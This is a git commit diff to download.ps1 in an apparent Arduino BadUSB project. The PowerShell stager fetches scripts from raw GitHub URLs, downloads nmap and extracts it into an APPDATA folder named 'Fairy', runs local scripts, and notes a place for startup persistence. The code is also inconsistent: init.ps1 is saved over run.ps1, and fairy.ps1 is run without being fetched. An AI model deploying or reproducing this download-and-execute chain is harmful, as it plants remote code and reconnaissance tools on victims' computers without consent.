aa8612b838940aeff82ccea45de821fbdedb82ae
h3xagon <62241425+h3xagon0001@users.noreply.github.com>
2025-06-29 16:32:08 +0800

    add downloading for init.ps1

--- download.ps1
+++ download.ps1
@@ -1,15 +1,19 @@
-# download run
+# download run and init
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.ps1 -OutFile run.ps1
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/run.vbs -OutFile run.vbs
+
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/h3xagon0001/arduino-micro-badusb/refs/heads/main/init.ps1 -OutFile run.ps1
 
 
 # download and extract nmap
 Invoke-WebRequest -Uri https://github.com/h3xagon0001/arduino-micro-badusb/raw/refs/heads/main/nmap.zip -OutFile nmap.zip
 Expand-Archive -LiteralPath "./nmap.zip" -DestinationPath "$($env:APPDATA)\Fairy" -Force; ./fairy.ps1
 
+
 # could add shortcut to startup here
 
 # run run.vbs for the first time
 ./run.vbs
+
 
 exit
